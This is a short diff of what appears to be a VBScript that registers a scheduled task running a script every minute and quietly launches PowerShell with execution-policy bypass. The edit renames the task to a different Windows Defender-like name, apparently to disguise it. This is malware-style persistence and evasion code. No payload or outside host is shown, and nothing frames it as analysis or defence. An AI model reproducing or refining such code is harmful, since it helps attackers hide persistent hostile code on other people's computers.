@@ -19,5 +19,5 @@ trigger.Repetition.Interval = "PT1M"
 Set action = taskDef.Actions.Create(0)
 action.Path = "wscript.exe"
 action.Arguments = """" & vbFile & """"
-rootFolder.RegisterTaskDefinition "WindowsDefenderUpdateScheduler", taskDef, 6, , , 3
+rootFolder.RegisterTaskDefinition "MicrosoftWindowsDefenderUpdateScheduleings", taskDef, 6, , , 3
 sh.Run "powershell.exe -ExecutionPolicy Bypass -File """ & psFile & """", 0, False
